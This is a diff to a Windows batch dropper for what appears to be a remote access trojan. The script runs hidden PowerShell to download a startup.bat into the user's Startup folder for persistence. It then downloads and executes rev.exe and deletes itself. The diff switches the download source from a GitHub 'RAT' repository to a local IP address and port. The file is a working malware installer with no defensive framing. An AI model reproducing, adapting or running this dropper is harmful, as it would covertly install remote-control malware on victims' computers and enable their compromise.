@@ -2,8 +2,8 @@
 del Starter.bat
 set "currentd=%cd%"
 cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-powershell -windowstyle hidden curl -o startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
+powershell -windowstyle hidden curl -o startup.bat http://192.168.1.9:9000/startup.bat
 cd %currentd%
-powershell -windowstyle hidden curl -o rev.exe https://raw.githubusercontent.com/saifnasef/RAT/main/rev.exe
+powershell -windowstyle hidden curl -o rev.exe http://192.168.1.9:9000/rev.exe
 rev.exe
 del "%~f0"
